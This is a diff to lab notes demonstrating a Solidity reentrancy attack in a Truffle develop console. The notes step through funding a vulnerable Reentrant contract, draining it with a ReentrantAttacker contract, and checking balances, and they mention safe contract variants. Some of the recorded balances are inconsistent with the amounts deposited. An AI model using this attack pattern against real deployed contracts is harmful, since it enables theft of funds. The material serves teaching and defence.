@@ -15,8 +15,8 @@ truffle(develop)> web3.eth.getBalance('0x9fbda871d559710256a2502a2517b794b482db4
 truffle(develop)> web3.eth.getBalance('0x30753e4a8aad7f8597332e813735def5dd395028').toString(10)
 '0'
 
-STEP 2 - Deposit 5 Ethers from a known account to Reentrant instance:
-truffle(develop)> Reentrant.deployed().then(instance => instance.deposit({from: web3.eth.accounts[1], value: web3.toWei(5, "ether") }))
+STEP 2 - Deposit 15 Ethers from a known account to Reentrant instance:
+truffle(develop)> Reentrant.deployed().then(instance => instance.deposit({from: web3.eth.accounts[1], value: web3.toWei(15, "ether") }))
 If encounter Error: Invalid number of arguments to Solidity function, delete the contracts in .\build directory, compile and migrate again.
 
 { tx: '0x678ab27b16d2bd023c4b67c0f6f97f08acd22c05ea2b7a2dfb2b69fc7ae84c53',
@@ -30,7 +30,7 @@ If encounter Error: Invalid number of arguments to Solidity function, delete the
      contractAddress: null,
      logs: [] },
   logs: [] }
-truffle(develop)> web3.eth.getBalance('0x9fbda871d559710256a2502a2517b794b482db40').toString(10)                                     ))
+truffle(develop)> web3.eth.getBalance('0x9fbda871d559710256a2502a2517b794b482db40').toString(10)
 '5000000000000000000'
 
 STEP 3 - Check withdraw count from Reentrant instance:
@@ -40,33 +40,44 @@ truffle(develop)> web3.eth.getBalance('0x30753e4a8aad7f8597332e813735def5dd39502
 Check the withdraw count from Reentrant instance:
 truffle(develop)> Reentrant.deployed().then(instance => instance.getWithdrawCount())
 BigNumber { s: 1, e: 0, c: [ 0 ] }
+Reentrant.deployed().then(function(instance){return instance.getWithdrawCount.call();}).then(function(value){return value.toNumber()});
 
 STEP 4 - Now invoke ReentrantAttacker attack function,
-by just sending 5 ethers to deposit in Reentrant instance, and immediately calling withdraw from Reentrant instance,
-ReentrantAttacker instance can steal all Ethers (10) from Reentrant
-truffle(develop)> ReentrantAttacker.deployed().then(inst => inst.attack({ value: web3.toWei(5, "ether") }))
-{ tx: '0xf00c295c0322cfef1eac2ca4d9ca6287f0b99d14471f81b9ae0ac0693e0068f3',
+by just sending 2 ethers to deposit in Reentrant instance, and immediately calling withdraw from Reentrant instance,
+ReentrantAttacker instance can steal Ethers (14) from Reentrant
+truffle(develop)> ReentrantAttacker.deployed().then(inst => inst.attack({ value: web3.toWei(2, "ether") }))
+{ tx: '0x2fab1eb12ed99c64c6cb7f777f40e2dbf9edd6a56934f7ec5b9c30c109bc9b53',
   receipt:
-   { transactionHash: '0xf00c295c0322cfef1eac2ca4d9ca6287f0b99d14471f81b9ae0ac0693e0068f3',
+   { transactionHash: '0x2fab1eb12ed99c64c6cb7f777f40e2dbf9edd6a56934f7ec5b9c30c109bc9b53',
      transactionIndex: 0,
-     blockHash: '0x1c02c0862c053c70f4045fe2b023217125dfa56044ff445070b9866494bba87b',
-     blockNumber: 11,
-     gasUsed: 66157,
-     cumulativeGasUsed: 66157,
+     blockHash: '0xb91201dbb274fb24e23daf0f8dc8df13b58db0b5d70aaabc8b8880a5cccdd57f',
+     blockNumber: 15,
+     gasUsed: 226227,
+     cumulativeGasUsed: 226227,
      contractAddress: null,
-     logs: [] },
+     logs:
+      [ [Object],
+        [Object],
+        [Object],
+        [Object],
+        [Object],
+        [Object],
+        [Object],
+        [Object] ] },
   logs: [] }
 
 STEP 5 - Check the withdraw count from Reentrant instance = 1 + no. of recursive calls
 truffle(develop)> Reentrant.deployed().then(instance => instance.getWithdrawCount())
 BigNumber { s: 1, e: 0, c: [ 2 ] }
+Reentrant.deployed().then(function(instance){return instance.getWithdrawCount.call();}).then(function(value){return value.toNumber()});
+8
 
 STEP 5 - ReentrantAttacker instance now has deposit amount + amounts from Reentrant instance
 truffle(develop)> web3.eth.getBalance('0x30753e4a8aad7f8597332e813735def5dd395028').toString(10)
-'10000000000000000000' !!!
+'16000000000000000000' !!!
 
-truffle(develop)> web3.eth.getBalance('0x9fbda871d559710256a2502a2517b794b482db40').toString(10)                                     ))
-'0' !!
+truffle(develop)> web3.eth.getBalance('0x9fbda871d559710256a2502a2517b794b482db40').toString(10)
+'1000000000000000000' !!!
 
 Points to ponder:
 https://ethereum.stackexchange.com/questions/6707/whats-the-difference-between-call-value-and-call-value
@@ -124,3 +135,10 @@ ReentrantAttackerFailed.deployed().then(inst => inst.attack({ value: web3.toWei(
 
 ReentrantSafe.deployed().then(function(instance){return instance.getWithdrawCount.call();}).then(function(value){return value.toNumber()});
 shows 0 as revert() will rollback all state changes.
+
+MISC
+var honey; Reentrant.deployed().then(function(deployed){honey=deployed;});
+var attacker; ReentrantAttacker.deployed().then(function(deployed){attacker=deployed;});
+honey.deposit({from: web3.eth.accounts[1], value: web3.toWei(15, "ether") })
+attacker.attack({ value: web3.toWei(2, "ether") }).then(function(result){console.log(result.logs[0].args.count);});
+var log0; attacker.attack({ value: web3.toWei(2, "ether") }).then(function(result){log0 = result.logs[0];});
